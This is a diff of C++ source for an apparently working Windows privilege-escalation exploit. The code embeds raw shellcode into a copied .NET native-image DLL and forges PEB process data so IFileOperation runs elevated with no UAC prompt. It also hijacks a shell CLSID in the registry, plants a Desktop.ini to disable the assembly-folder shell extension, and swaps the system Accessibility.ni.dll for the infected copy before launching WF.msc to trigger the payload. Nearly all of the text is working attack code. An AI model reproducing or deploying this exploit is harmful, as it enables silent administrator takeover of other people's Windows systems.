@@ -80,11 +80,11 @@ typedef struct _RTL_USER_PROCESS_PARAMETERS
 	/* 0x043c */ long __PADDING__[1];
 } RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS; /* size: 0x0440 */
 
-#define PEB_OFFSET 0x60ULL
-#define PROCESS_PARAM_OFFSET 0x20ULL
-#define BASENAME_OFFSET 0x58ULL
-#define FULLNAME_OFFSET 0x48ULL
-#define DLLBASE_OFFSET 0x30ULL
+constexpr auto PEB_OFFSET = 0x60ULL;
+constexpr auto PROCESS_PARAM_OFFSET = 0x20ULL;
+constexpr auto BASENAME_OFFSET = 0x58ULL;
+constexpr auto FULLNAME_OFFSET = 0x48ULL;
+constexpr auto DLLBASE_OFFSET = 0x30ULL;
 #pragma endregion
 
 using RtlInitUnicodeStringPtr = void(NTAPI*)(PUNICODE_STRING, PCWSTR);
@@ -98,7 +98,7 @@ struct LDR_CALLBACK_PARAMS
 	RtlInitUnicodeStringPtr RtlInitUnicodeString;
 };
 
-const BYTE shellCode[] = {
+const BYTE SHELL_CODE[] = {
 			   0x80, 0xFA, 0x01, 0x0F, 0x85, 0xA1, 0x00, 0x00, 0x00, 0x57, 0x48, 0x81, 0xEC, 0xE0, 0x00, 0x00, 0x00,
 			   0x48, 0x8D, 0x44, 0x24, 0x70, 0x48, 0x89, 0xC7, 0x31, 0xC0, 0xB9, 0x68, 0x00, 0x00, 0x00, 0xF3, 0xAA,
 			   0xC7, 0x44, 0x24, 0x70, 0x68, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x44, 0x24, 0x50, 0x48, 0x89, 0x44, 0x24,
@@ -188,21 +188,21 @@ tryagain:
 	  *	Copy the target dll, infect it and save it as "infect.dll"
 	  */
 
-	if (!CopyFileW(fullPath.c_str(), L"Accessibility.ni.dll", FALSE))
+	if (!CopyFileW(fullPath.c_str(), L"infect.dll", FALSE))
 	{
 		std::wcout << L"Failed to copy " << fullPath.c_str() << L" to the current directory. Error: " << GetLastError() << std::endl;
 		return EXIT_FAILURE;
 	}
 
-	const auto fileHandle = CreateFileW(L"Accessibility.ni.dll", FILE_READ_ACCESS | FILE_WRITE_ACCESS, 0, nullptr, OPEN_EXISTING,
-		FILE_ATTRIBUTE_NORMAL, nullptr);
+	auto* const fileHandle = CreateFileW(L"infect.dll", FILE_READ_ACCESS | FILE_WRITE_ACCESS, 0, nullptr, OPEN_EXISTING,
+	                                     FILE_ATTRIBUTE_NORMAL, nullptr);
 	if (fileHandle == INVALID_HANDLE_VALUE)
 	{
 		std::cout << "Failed to open 'infect.dll'. Error: " << GetLastError() << std::endl;
 		return EXIT_FAILURE;
 	}
 
-	const auto mapping = CreateFileMappingW(fileHandle, nullptr, PAGE_READWRITE, 0, 0, nullptr);
+	auto* const mapping = CreateFileMappingW(fileHandle, nullptr, PAGE_READWRITE, 0, 0, nullptr);
 	if (!mapping)
 	{
 		CloseHandle(fileHandle);
@@ -210,7 +210,7 @@ tryagain:
 		return EXIT_FAILURE;
 	}
 
-	const auto pTargetFile = MapViewOfFile(mapping, FILE_MAP_ALL_ACCESS, 0, 0, 0);
+	auto* const pTargetFile = MapViewOfFile(mapping, FILE_MAP_ALL_ACCESS, 0, 0, 0);
 	if (!pTargetFile)
 	{
 		CloseHandle(mapping);
@@ -219,19 +219,19 @@ tryagain:
 		return EXIT_FAILURE;
 	}
 
-	auto headers = reinterpret_cast<PIMAGE_NT_HEADERS>(static_cast<PBYTE>(pTargetFile) + static_cast<
+	auto* headers = reinterpret_cast<PIMAGE_NT_HEADERS>(static_cast<PBYTE>(pTargetFile) + static_cast<
 		PIMAGE_DOS_HEADER>(pTargetFile)->e_lfanew);
 
-	auto section = IMAGE_FIRST_SECTION(headers);
+	auto* section = IMAGE_FIRST_SECTION(headers);
 	while (std::strcmp(".text", reinterpret_cast<char const*>(section->Name)))
 		++section;
 
-	auto zeroBlock = static_cast<PBYTE>(pTargetFile) + section->PointerToRawData;
+	auto* zeroBlock = static_cast<PBYTE>(pTargetFile) + section->PointerToRawData;
 
 	for (; ++zeroBlock;)
 	{
 		auto fail = false;
-		for (auto z = zeroBlock; z != zeroBlock + sizeof shellCode + (cmdPath.size() * 2) + sizeof(L'\0'); ++z)
+		for (auto* z = zeroBlock; z != zeroBlock + sizeof SHELL_CODE + (cmdPath.size() * 2) + sizeof(L'\0'); ++z)
 		{
 			if (*z)
 			{
@@ -243,8 +243,8 @@ tryagain:
 			break;
 	}
 
-	memcpy(zeroBlock, shellCode, sizeof shellCode);
-	memcpy(zeroBlock + sizeof shellCode, cmdPath.c_str(), (cmdPath.size() * 2) + sizeof(L'\0'));
+	memcpy(zeroBlock, SHELL_CODE, sizeof SHELL_CODE);
+	memcpy(zeroBlock + sizeof SHELL_CODE, cmdPath.c_str(), (cmdPath.size() * 2) + sizeof(L'\0'));
 
 	*reinterpret_cast<PDWORD>(zeroBlock + 0x99) = static_cast<DWORD>(reinterpret_cast<PBYTE>(CreateProcessW) -
 		reinterpret_cast<PBYTE>(GetModuleHandleW(L"kernel32.dll")));
@@ -276,8 +276,8 @@ tryagain:
 	  *	Forge process information to allow IFileOperation as Administrator w/o UAC prompt
 	  */
 
-	auto pPeb = *reinterpret_cast<PBYTE*>(reinterpret_cast<PBYTE>(NtCurrentTeb()) + PEB_OFFSET);
-	auto pProcessParams = *reinterpret_cast<PRTL_USER_PROCESS_PARAMETERS*>(pPeb + PROCESS_PARAM_OFFSET);
+	auto* pPeb = *reinterpret_cast<PBYTE*>(reinterpret_cast<PBYTE>(NtCurrentTeb()) + PEB_OFFSET);
+	auto* pProcessParams = *reinterpret_cast<PRTL_USER_PROCESS_PARAMETERS*>(pPeb + PROCESS_PARAM_OFFSET);
 	auto RtlInitUnicodeString = reinterpret_cast<RtlInitUnicodeStringPtr>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlInitUnicodeString"));
 	auto LdrEnumerateLoadedModules = reinterpret_cast<LdrEnumerateLoadedModulesPtr>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "LdrEnumerateLoadedModules"));
 
@@ -288,7 +288,7 @@ tryagain:
 
 	LdrEnumerateLoadedModules(0, [](PVOID ldrEntry, PVOID context, PBOOLEAN stop)
 		{
-			auto params = static_cast<LDR_CALLBACK_PARAMS*>(context);
+			auto* params = static_cast<LDR_CALLBACK_PARAMS*>(context);
 
 			if (*reinterpret_cast<PULONG_PTR>(reinterpret_cast<ULONG_PTR>(ldrEntry) + DLLBASE_OFFSET) == reinterpret_cast<
 				ULONG_PTR>(params->ImageBase))
@@ -353,12 +353,14 @@ tryagain:
 		HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\CLSID\\{1D2680C9-0E2A-469d-B787-065558BC7D43}", 0, nullptr,
 		REG_OPTION_NON_VOLATILE, KEY_CREATE_SUB_KEY | KEY_SET_VALUE, nullptr, &userKey, &openResult)))
 	{
+		fileOperation->Release();
 		CoUninitialize();
-		std::cout << "RegOpenCurrentUser() failed. Error " << status << std::endl;
+		std::cout << "RegOpenCurrentUser() (0) failed. Error " << status << std::endl;
 		return EXIT_FAILURE;
 	}
 	if ((status = RegSetValueExW(userKey, nullptr, 0, REG_SZ, reinterpret_cast<const BYTE*>(L""), sizeof(L""))))
 	{
+		fileOperation->Release();
 		RegCloseKey(userKey);
 		CoUninitialize();
 		std::cout << "RegSetValueExW() (0) failed. Error " << status << std::endl;
@@ -368,6 +370,7 @@ tryagain:
 		&userKey,
 		&openResult)))
 	{
+		fileOperation->Release();
 		RegCloseKey(userKey);
 		CoUninitialize();
 		std::cout << "RegCreateKeyExW() failed. Error " << status << std::endl;
@@ -375,6 +378,7 @@ tryagain:
 	}
 	if ((status = RegSetValueExW(userKey, nullptr, 0, REG_SZ, reinterpret_cast<const BYTE*>(L""), sizeof(L""))))
 	{
+		fileOperation->Release();
 		RegCloseKey(userKey);
 		CoUninitialize();
 		std::cout << "RegSetValueExW() (1) failed. Error " << status << std::endl;
@@ -387,10 +391,153 @@ tryagain:
 	 *	END STAGE 4
 	 */
 
-	 /*
-	  *	STAGE 5
-	  *	Delete the original Accessibility.ni.dll file and move our inject.dll file with the correct name over there
-	  */
+	/*
+	 *	BEGIN STAGE 5
+	 *	Force copy new Desktop.ini into assembly folder to disable shfusion.dll via IFileOperation bug
+	 */
+	
+	CreateDirectoryW(L"byeinteg_files", nullptr);
+	std::ofstream dumIni{ "byeinteg_files\\Desktop.ini" };
+	IShellItem* assemblyFolder, * dummyFile, * iniFile;
+
+	dumIni.close();
+	explorer = explorer.substr(0, explorer.find(L"explorer.exe"));
+	explorer += L"assembly";
+
+	result = SHCreateItemFromParsingName(explorer.c_str(), nullptr, IID_IShellItem, reinterpret_cast<void**>(&assemblyFolder));
+	if (FAILED(result))
+	{
+		fileOperation->Release();
+		CoUninitialize();
+		std::cout << "SHCreateItemFromParsingName() (0) failed. HRESULT: 0x" << std::hex << result << std::endl;
+		return EXIT_FAILURE;
+	}
+
+	auto requiredSize = static_cast<ULONG_PTR>(GetCurrentDirectoryW(0, nullptr));
+	auto* currentDirectory = new WCHAR[requiredSize + 27];
+	GetCurrentDirectoryW(static_cast<DWORD>(requiredSize), currentDirectory);
+	wcscat_s(currentDirectory, requiredSize + 27, L"\\byeinteg_files\\Desktop.ini");
+	
+	result = SHCreateItemFromParsingName(currentDirectory, nullptr, IID_IShellItem, reinterpret_cast<void**>(&dummyFile));
+	delete[] currentDirectory;
+	if (FAILED(result))
+	{
+		assemblyFolder->Release();
+		fileOperation->Release();
+		CoUninitialize();
+		std::cout << "SHCreateItemFromParsingName() (1) failed. HRESULT: 0x" << std::hex << result << std::endl;
+		return EXIT_FAILURE;
+	}
+
+	result = fileOperation->SetOperationFlags(FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION | FOF_NOERRORUI);
+	if (FAILED(result))
+	{
+		dummyFile->Release();
+		assemblyFolder->Release();
+		fileOperation->Release();
+		CoUninitialize();
+		std::cout << "IFileOperation::SetOperationFlags() failed. HRESULT: 0x" << std::hex << result << std::endl;
+		return EXIT_FAILURE;
+	}
+	result = fileOperation->CopyItem(dummyFile, assemblyFolder, nullptr, nullptr);
+	if (FAILED(result))
+	{
+		assemblyFolder->Release();
+		dummyFile->Release();
+		fileOperation->Release();
+		CoUninitialize();
+		std::cout << "IFileOperation::CopyItem() failed. HRESULT: 0x" << std::hex << result << std::endl;
+		return EXIT_FAILURE;
+	}
+	result = fileOperation->PerformOperations();
+	if (FAILED(result))
+	{
+		assemblyFolder->Release();
+		dummyFile->Release();
+		fileOperation->Release();
+		CoUninitialize();
+		std::cout << "IFileOperation::PerformOperations() (0) failed. HRESULT: 0x" << std::hex << result << std::endl;
+		return EXIT_FAILURE;
+	}
+
+	assemblyFolder->Release();
+	dummyFile->Release();
+
+	/*
+	 *	END STAGE 5
+	 */
+
+	/*
+	 *	BEGIN STAGE 6
+	 *	Undo changes to the registry so we can browse the assembly folder completely normally.
+	 *	Also delete the dummy Desktop.ini we copied over there.
+	 */
+
+	if ((status = RegCreateKeyExW(
+		HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\CLSID\\{1D2680C9-0E2A-469d-B787-065558BC7D43}", 0, nullptr,
+		REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &userKey, &openResult)))
+	{
+		fileOperation->Release();
+		CoUninitialize();
+		std::cout << "RegOpenCurrentUser() (1) failed. Error " << status << std::endl;
+		return EXIT_FAILURE;
+	}
+	if ((status = RegDeleteKeyExW(userKey, L"Server", KEY_WOW64_64KEY, 0)))
+	{
+		RegCloseKey(userKey);
+		fileOperation->Release();
+		CoUninitialize();
+		std::cout << "RegDeleteKeyExW() (0) failed. Error " << status << std::endl;
+		return EXIT_FAILURE;
+	}
+	RegCloseKey(userKey);
+	if ((status = RegDeleteKeyExW(
+		HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\CLSID\\{1D2680C9-0E2A-469d-B787-065558BC7D43}", KEY_WOW64_64KEY, 0)))
+	{
+		fileOperation->Release();
+		CoUninitialize();
+		std::cout << "RegDeleteKeyExW() (1) failed. Error " << status << std::endl;
+		return EXIT_FAILURE;
+	}
+	
+	explorer += L"\\Desktop.ini";
+	result = SHCreateItemFromParsingName(explorer.c_str(), nullptr, IID_IShellItem, reinterpret_cast<void**>(&iniFile));
+	if (FAILED(result))
+	{
+		fileOperation->Release();
+		CoUninitialize();
+		std::cout << "SHCreateItemFromParsingName() (2) failed. HRESULT: 0x" << std::hex << result << std::endl;
+		return EXIT_FAILURE;
+	}
+	result = fileOperation->DeleteItem(iniFile, nullptr);
+	if (FAILED(result))
+	{
+		iniFile->Release();
+		fileOperation->Release();
+		CoUninitialize();
+		std::cout << "IFileOperation::DeleteItem() failed. HRESULT: 0x" << std::hex << result << std::endl;
+		return EXIT_FAILURE;
+	}
+	result = fileOperation->PerformOperations();
+	if (FAILED(result))
+	{
+		iniFile->Release();
+		fileOperation->Release();
+		CoUninitialize();
+		std::cout << "IFileOperation::PerformOperations() (1) failed. HRESULT: 0x" << std::hex << result << std::endl;
+		return EXIT_FAILURE;
+	}
+	
+	iniFile->Release();
+	
+	/*
+	 *	END STAGE 6
+	 */
+	
+	/*
+	 *	STAGE 7
+	 *	Delete the original Accessibility.ni.dll file and move our inject.dll file with the correct name over there
+	 */
 
 	IShellItem* existingFile, * targetFile, * targetFolder;
 
@@ -400,25 +547,25 @@ tryagain:
 	{
 		fileOperation->Release();
 		CoUninitialize();
-		std::cout << "SHCreateItemFromParsingName() (0) failed. HRESULT: 0x" << std::hex << result << std::endl;
+		std::cout << "SHCreateItemFromParsingName() (3) failed. HRESULT: 0x" << std::hex << result << std::endl;
 		return EXIT_FAILURE;
 	}
-	fullPath = fullPath.substr(0, fullPath.size() - std::wcslen(L"\\Accessibility.ni.dll"));
+	fullPath = fullPath.substr(0, fullPath.size() - std::wcslen(L"Accessibility.ni.dll"));
 	result = SHCreateItemFromParsingName(fullPath.c_str(), nullptr, IID_IShellItem, reinterpret_cast<void**>(&targetFolder));
 	if (FAILED(result))
 	{
 		existingFile->Release();
 		fileOperation->Release();
 		CoUninitialize();
-		std::cout << "SHCreateItemFromParsingName() (1) failed. HRESULT: 0x" << std::hex << result << std::endl;
+		std::cout << "SHCreateItemFromParsingName() (4) failed. HRESULT: 0x" << std::hex << result << std::endl;
 		return EXIT_FAILURE;
 	}
 
-	auto requiredSize = static_cast<ULONG_PTR>(GetCurrentDirectoryW(0, nullptr));
-	auto currentDirectory = new WCHAR[requiredSize + 21];
+	requiredSize = static_cast<ULONG_PTR>(GetCurrentDirectoryW(0, nullptr));
+	currentDirectory = new WCHAR[requiredSize + 11];
 	GetCurrentDirectoryW(static_cast<DWORD>(requiredSize), currentDirectory);
 
-	wcscat_s(currentDirectory, requiredSize + 21, L"\\Accessibility.ni.dll");
+	wcscat_s(currentDirectory, requiredSize + 11, L"\\infect.dll");
 	result = SHCreateItemFromParsingName(currentDirectory, nullptr, IID_IShellItem,
 		reinterpret_cast<void**>(&targetFile));
 	if (FAILED(result))
@@ -428,22 +575,13 @@ tryagain:
 		existingFile->Release();
 		fileOperation->Release();
 		CoUninitialize();
-		std::cout << "SHCreateItemFromParsingName() (2) failed. HRESULT: 0x" << std::hex << result << std::endl;
+		std::cout << "SHCreateItemFromParsingName() (5) failed. HRESULT: 0x" << std::hex << result << std::endl;
 		return EXIT_FAILURE;
 	}
-	
-	//result = fileOperation->RenameItem(targetFile, L"Accessibility.ni.dll", nullptr);
-	//if (FAILED(result))
-	//{
-	//	targetFile->Release();
-	//	targetFolder->Release();
-	//	existingFile->Release();
-	//	fileOperation->Release();
-	//	CoUninitialize();
-	//	std::cout << "IFileOperation::DeleteItem() failed. HRESULT: 0x" << std::hex << result << std::endl;
-	//	return EXIT_FAILURE;
-	//}
-	result = fileOperation->CopyItem(targetFile, targetFolder, nullptr, nullptr);
+
+	delete[] currentDirectory;
+
+	result = fileOperation->RenameItem(existingFile, L"Accessibility.ni.dll.bak", nullptr);
 	if (FAILED(result))
 	{
 		targetFile->Release();
@@ -451,7 +589,18 @@ tryagain:
 		existingFile->Release();
 		fileOperation->Release();
 		CoUninitialize();
-		std::cout << "IFileOperation::CopyItem() failed. HRESULT: 0x" << std::hex << result << std::endl;
+		std::cout << "IFileOperation::RenameItem() failed. HRESULT: 0x" << std::hex << result << std::endl;
+		return EXIT_FAILURE;
+	}
+	result = fileOperation->MoveItem(targetFile, targetFolder, L"Accessibility.ni.dll", nullptr);
+	if (FAILED(result))
+	{
+		targetFile->Release();
+		targetFolder->Release();
+		existingFile->Release();
+		fileOperation->Release();
+		CoUninitialize();
+		std::cout << "IFileOperation::MoveItem() failed. HRESULT: 0x" << std::hex << result << std::endl;
 		return EXIT_FAILURE;
 	}
 	result = fileOperation->PerformOperations();
@@ -462,7 +611,7 @@ tryagain:
 		existingFile->Release();
 		fileOperation->Release();
 		CoUninitialize();
-		std::cout << "IFileOperation::PerformOperations() failed. HRESULT: 0x" << std::hex << result << std::endl;
+		std::cout << "IFileOperation::PerformOperations() (2) failed. HRESULT: 0x" << std::hex << result << std::endl;
 		return EXIT_FAILURE;
 	}
 
@@ -473,12 +622,12 @@ tryagain:
 	CoUninitialize();
 
 	/*
-	 *	END STAGE 5
+	 *	END STAGE 7
 	 */
-
+	
 	 /*
-	  *	STAGE 6
-	  *	Launch Event Viewer via eventvwr.exe to execute the exploit and do the attack.
+	  *	STAGE 8
+	  *	Launch the Firewall Snap-in via WF.msc to execute the exploit and do the attack.
 	  */
 
 	if (reinterpret_cast<int>(ShellExecuteW(nullptr, L"open", L"WF.msc", nullptr, nullptr, SW_NORMAL)) <= 32)
@@ -488,7 +637,7 @@ tryagain:
 	}
 
 	/*
-	 *	END STAGE 6
+	 *	END STAGE 8
 	 */
 
 	 // Finally, we can print success and exit.
